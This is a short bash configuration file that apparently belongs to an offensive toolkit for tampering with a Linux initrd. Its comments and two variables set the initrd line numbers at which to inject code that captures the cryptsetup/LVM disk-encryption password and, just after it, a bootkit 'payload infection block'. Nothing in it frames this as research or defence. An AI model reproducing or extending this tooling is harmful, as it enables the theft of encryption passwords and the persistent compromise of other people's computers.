#!/bin/bash

#These are the default initrd lines for:
# - injecting password capture into cryptsetup password usage
# - injecting bootkit payload into user system
#
#Generally universal numbers are not recommended, but it may be worth to try
#Script SHOULD get these lines' content and ask you

#which line of script should be altered to get LVM password?
EXTRALOGLINENUMBER=263
#which line should contain payload infection block (best: just after password)?
PAYLOADLINENUMBER=268

